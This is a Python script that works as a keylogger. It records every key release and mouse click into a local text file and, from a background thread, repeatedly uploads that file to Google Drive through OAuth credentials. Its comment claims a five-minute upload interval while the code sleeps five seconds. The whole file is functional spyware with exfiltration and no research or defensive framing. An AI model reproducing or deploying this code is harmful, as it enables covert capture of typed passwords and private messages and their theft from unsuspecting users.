import os.path
import pickle
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from google_auth_oauthlib.flow import InstalledAppFlow
import time
import threading

# Define the scopes and credentials JSON file
SCOPES = ['https://www.googleapis.com/auth/drive.file']
CREDENTIALS_JSON_FILE = 'credentials.json'
TOKEN_PICKLE_FILE = 'token.pickle'

def authenticate():
    flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_JSON_FILE, SCOPES)
    
    if os.path.exists(TOKEN_PICKLE_FILE):
        with open(TOKEN_PICKLE_FILE, 'rb') as token_file:
            credentials = pickle.load(token_file)
    else:
        credentials = flow.run_local_server()
        with open(TOKEN_PICKLE_FILE, 'wb') as token_file:
            pickle.dump(credentials, token_file)
    
    return credentials

def upload_file(drive_service, file_name):
    file_metadata = {'name': file_name}
    media = MediaFileUpload(file_name, mimetype='text/plain')
    uploaded_file = drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f"File '{file_name}' uploaded with ID: {uploaded_file['id']}")

def file_upload_loop():
    credentials = authenticate()
    drive_service = build('drive', 'v3', credentials=credentials)
    
    file_name = 'text.txt'
    
    while True:
        upload_file(drive_service, file_name)
        time.sleep(5)  # Sleep for 5 minutes (300 seconds) before uploading again

def write_to_file(data):
    with open("text.txt", "a") as file:
        file.write(data)

def on_key_release(key):
    try:
        write_to_file(f"Key released: {key}\n")
    except Exception as e:
        print(f"Error: {e}") 

def on_click(x, y, button, pressed):
    try:
        action = "Pressed" if pressed else "Released"
        write_to_file(f"Mouse {action} at ({x}, {y}) with {button}\n")
    except Exception as e:
        print(f"Error: {e}")

# Start the file upload loop in a separate thread
upload_thread = threading.Thread(target=file_upload_loop)
upload_thread.daemon = True
upload_thread.start()

# Set up keyboard listener
with Listener(on_release=on_key_release) as keyboard_listener:
    # Set up mouse listener
    with MouseListener(on_click=on_click) as mouse_listener:
        try:
            keyboard_listener.join()
            mouse_listener.join()
        except Exception as e:
            print(f"Error: {e}")
